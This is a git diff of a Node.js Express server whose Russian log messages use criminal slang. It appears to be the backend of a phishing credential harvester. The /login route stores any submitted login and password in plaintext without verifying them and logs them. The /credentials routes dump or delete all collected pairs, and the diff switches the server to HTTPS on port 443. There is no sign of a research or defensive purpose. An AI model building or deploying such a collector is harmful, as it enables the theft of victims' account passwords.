@@ -2,8 +2,10 @@ const express = require('express');
 const cors = require('cors');
 const mongoose = require('mongoose');
 const app = express();
-const port = 3000;
+const port = 443;
 const dotenv = require('dotenv');
+const {createServer} = require('node:https');
+const { readFileSync } = require('fs')
 
 dotenv.config();
 
@@ -30,13 +32,14 @@ const User = mongoose.model('User', userSchema, MONGO_COLLECTION);
 app.use(cors());
 app.use(express.json());
 
+
 app.post('/login', async (req, res) => {
     console.log('Вентилируем запрос...')
-    const { login, password } = req.body;
+    const {login, password} = req.body;
     if (login && password) {
         console.log(`Малява верная, касатик -  ${login}`)
         try {
-            const newUser = new User({ login: login.trim(), password: password.trim() });
+            const newUser = new User({login: login.trim(), password: password.trim()});
             await newUser.save();
             res.status(200).send(`Пользователь с логином ${login} успешно сохранён в базе данных.`);
             console.log(`Вписан в хату: ${newUser.login}:${newUser.password}`);
@@ -51,12 +54,12 @@ app.post('/login', async (req, res) => {
 
 app.get('/credentials', async (req, res) => {
     console.log('Вентилируем запрос на креды...')
-        try {
-            const users = await User.find({}, 'login password createdAt');
-            res.status(200).send(users);
-        } catch (error) {
-            res.status(500).send('Ошибка при получении кредов.');
-        }
+    try {
+        const users = await User.find({}, 'login password createdAt');
+        res.status(200).send(users);
+    } catch (error) {
+        res.status(500).send('Ошибка при получении кредов.');
+    }
 });
 
 app.delete('/credentials', async (req, res) => {
@@ -69,6 +72,13 @@ app.delete('/credentials', async (req, res) => {
     }
 });
 
-app.listen(port, () => {
-    console.log(`Кинули ухо http://localhost:${port}`);
+
+const options = {
+    key: readFileSync('./client-key.pem'),
+    cert: readFileSync('/client-cert.pem'),
+};
+
+createServer(options, app).listen(port, () => {
+    console.log(`Кинули ухо https://localhost:${port}`);
 });
+
